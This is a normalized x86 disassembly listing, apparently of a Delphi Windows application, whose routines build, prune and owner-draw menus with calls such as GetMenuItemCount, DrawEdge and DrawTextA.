mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45deec
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45ceb4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45d3b0
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_459db4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45a688
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a6d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41f0f4
mov eax [ ebp - 0x4 ]
call sub_459c3c
mov edx eax
mov eax ebx
call sub_45c328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a6d9
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_45a6e0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45a758
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_420094
sub_45a71c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420414
mov eax ebx
call sub_45c2dc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45c2dc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403450
pop esi
pop ebx
retn
mov eax ebx
call sub_45a758
sub_45a758
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45a888
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45a758
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45a888
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45a888
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45a618
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebp
call sub_45a888
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a828
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45c2f4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45c304
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45c304
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45c304
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_459930
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45a888
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45a618
mov eax [ rw-data ]
call sub_459930
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45a8d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42033c
push ebx
push sub_45a688
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45a918
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45aafc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45c8b0
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_40403c
test bh 0x4
je r-xdata
mov eax edi
call sub_45deec
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_423db0
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40426c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423768
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab03
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404264
push eax
mov eax [ ebp - 0xc ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4234a8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404264
push eax
mov eax [ ebp - 0xc ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4234a8
mov eax 0xff00000d
call sub_422fe8
mov esi eax
mov eax 0xff000010
call sub_422fe8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4234a8
jmp r-xdata
sub_45ab68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45b450
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423c94
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4234a8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423c94
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457704
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423c94
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45afaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429f00
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4234a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457704
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423c94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c8c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42affc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c68
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4240b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424288
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457c1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423c94
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423774
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_423f8c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4234a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403254
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a918
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b457
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_4599dc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a918
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
